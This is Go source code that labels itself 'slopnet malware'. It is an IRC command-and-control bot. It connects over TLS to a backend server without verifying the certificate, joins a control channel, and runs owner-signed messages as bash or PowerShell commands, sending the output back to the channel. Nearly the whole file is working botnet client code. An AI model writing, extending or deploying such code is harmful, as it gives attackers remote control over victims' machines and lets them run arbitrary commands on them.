// the notorious slopnet malware
package main

import (
	"bufio"
	"crypto/ed25519"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"
)

var pingR = regexp.MustCompile(("^PING (?P<code>\\S+)$"))
var endmotdR = regexp.MustCompile(("^:\\S+ 376 \\S+ :.*$"))
var cmdR = regexp.MustCompile(("^:(?P<from>\\S+)!(\\S+) PRIVMSG " + regexp.QuoteMeta(backendChannel) + " :(?P<to>\\S+): (?P<cmd>.+)$"))

func execCmd(input string) string {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "linux":
		cmd = exec.Command("bash", "-c", input)
	case "windows":
		cmd = exec.Command("powershell", "-NoProfile", "-Command", input)
	}
	output, _ := cmd.CombinedOutput()
	return string(output)
}

func generateNick() string {
	rand.Seed(time.Now().Unix())
	charset := "abcdefghijklmnopqrstuvwxyz"
	nick := make([]byte, 8)
	for i := range nick {
		nick[i] = charset[rand.Intn(len(charset))]
	}
	return string(nick)
}

func main() {
	publicKeyBytes, err := base64.StdEncoding.DecodeString(backendPubkey)
	if err != nil {
		log.Fatalln(err)
	}
	publicKeyObject := ed25519.PublicKey(publicKeyBytes)

	nick := generateNick()

	conn, err := tls.Dial("tcp", backendAddr, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		log.Fatalln(err)
	}

	if backendPass != "" {
		fmt.Fprintf(conn, "PASS %s\r\n", backendPass)
	}

	fmt.Fprintf(conn, "USER %s 0 * :%s\r\n", nick, nick)
	fmt.Fprintf(conn, "NICK %s\r\n", nick)

	scanner := bufio.NewScanner(conn)
	lastMsg := ""
	for scanner.Scan() {
		line := scanner.Text()
		log.Println(line)

		if pingR.MatchString(line) {
			submatches := pingR.FindStringSubmatch(line)
			code := submatches[pingR.SubexpIndex("code")]
			fmt.Fprintf(conn, "PONG %s\r\n", code)
			continue
		}

		if endmotdR.MatchString(line) {
			fmt.Fprintf(conn, "JOIN "+backendChannel+"\r\n")
			continue
		}

		if cmdR.MatchString(line) {
			submatches := cmdR.FindStringSubmatch(line)
			from := submatches[cmdR.SubexpIndex("from")]
			to := submatches[cmdR.SubexpIndex("to")]
			cmd := submatches[cmdR.SubexpIndex("cmd")]
			if from == backendOwner && (to == nick || to == "*") {
				cmdBytes, err := base64.StdEncoding.DecodeString(cmd)
				if err == nil {
					if ed25519.Verify(publicKeyObject, []byte(lastMsg), []byte(cmdBytes)) {
						output := strings.Split(execCmd(lastMsg), "\n")
						for _, outputline := range output {
							fmt.Fprintf(conn, "PRIVMSG "+backendChannel+" :%s\r\n", outputline)
						}
					} else {
						fmt.Println("Signature did not match")
					}
				}
				lastMsg = cmd
			}
			continue
		}
	}
}
